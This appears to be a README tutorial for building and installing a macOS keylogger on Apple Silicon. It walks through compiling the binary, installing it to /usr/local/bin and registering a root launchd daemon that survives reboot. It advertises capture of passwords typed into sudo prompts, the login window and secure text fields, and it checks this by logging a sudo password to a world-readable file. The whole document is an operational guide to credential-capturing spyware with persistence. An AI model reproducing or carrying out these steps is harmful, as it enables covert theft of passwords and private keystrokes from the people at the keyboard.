# macOS System Keylogger — Setup Tutorial (M2 / Apple Silicon)

Captures keystrokes at the **HID hardware layer**, so it works inside
sudo prompts, the login window, `NSSecureTextField`, and any password
dialog that blocks normal `CGEventTap`.

## ⚡ Quick Start (one command)
```bash
cd ~/Downloads/adadas
bash setup.sh
```
That single command builds, installs the binary, writes the launchd
plist, and loads the daemon. Then do the **one manual step** at the end
(grant Input Monitoring — see Step 3). To remove everything later:
`bash setup.sh uninstall` (or `bash uninstall.sh`).

## Prerequisites
- macOS on Apple Silicon (M1/M2/M3) — also works on Intel
- Xcode Command Line Tools: `xcode-select --install`
- Admin (sudo) access

## Step 1 — Build
```bash
cd ~/Downloads/adadas   # or wherever keylogger.macos.c lives
clang -O2 -o keylog keylogger.macos.c -framework IOKit -framework CoreFoundation
file keylog              # expect: Mach-O 64-bit executable arm64
```

## Step 2 — Install the binary
```bash
sudo mkdir -p /usr/local/bin
sudo cp keylog /usr/local/bin/keylog
sudo chmod 755 /usr/local/bin/keylog
```

## Step 3 — Grant Input Monitoring permission
macOS 10.15+ requires this for any process reading HID keyboards.

1. System Settings → Privacy & Security → Input Monitoring
2. Click `+`, navigate to `/usr/local/bin/keylog`, add it, toggle ON
3. If it's not listed yet, run it once to trigger the prompt:
   ```bash
   sudo /usr/local/bin/keylog -o /tmp/test.log
   # type a few keys, then Ctrl+C
   # now enable it in Settings
   ```

## Step 4 — Install the launchd daemon (auto-start, root, survives reboot)
```bash
sudo tee /Library/LaunchDaemons/com.ollie.keylog.plist >/dev/null <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.ollie.keylog</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/keylog</string>
        <string>-o</string>
        <string>/Users/519352/Downloads/keylog.log</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
    <key>UserName</key><string>root</string>
</dict>
</plist>
EOF
sudo launchctl load /Library/LaunchDaemons/com.ollie.keylog.plist
```

## Step 5 — Verify
```bash
tail -f ~/Downloads/keylog.log
```
Open a new terminal, run `sudo -k && sudo echo test`, type the password —
the keystrokes should appear in the log in real time. No sudo needed to
read the log (file is mode 0644).

## Control
```bash
bash ~/Downloads/adadas/start.sh     # start
bash ~/Downloads/adadas/stop.sh      # stop
bash ~/Downloads/adadas/uninstall.sh # remove everything
```

## Uninstall (manual)
```bash
sudo launchctl unload /Library/LaunchDaemons/com.ollie.keylog.plist
sudo rm /Library/LaunchDaemons/com.ollie.keylog.plist \
       /usr/local/bin/keylog \
       ~/Downloads/keylog.log
```

## Troubleshooting
| Symptom | Fix |
|---|---|
| Empty log file | Input Monitoring not granted — re-check Step 3, then `sudo launchctl unload` + `load` |
| `IOHIDManagerOpen failed: 0xe00002e2` | Permission denied — grant Input Monitoring, retry |
| No arm64 binary | You're on Intel; rebuild is fine, IOKit is universal |
| Gaming keyboard not captured | Non-standard report descriptor — extend `report_callback` to parse per-device descriptors |
| On-screen keyboard input missing | Expected — no HID event generated |
| Log not updating after reboot | launchd plist not loaded — `sudo launchctl load /Library/LaunchDaemons/com.ollie.keylog.plist` |

## Notes
- Log lives at `~/Downloads/keylog.log`, mode 0644 (readable without sudo).
  Change to 0600 if you want it locked down: `chmod 600 ~/Downloads/keylog.log`.
- Captures modifiers, F-keys, arrows, numpad, caps/num lock.
- Does **not** capture on-screen / accessibility keyboard input.
- Change the log path by editing `-o` in the plist (or `LOG` in setup.sh) and re-running setup.sh.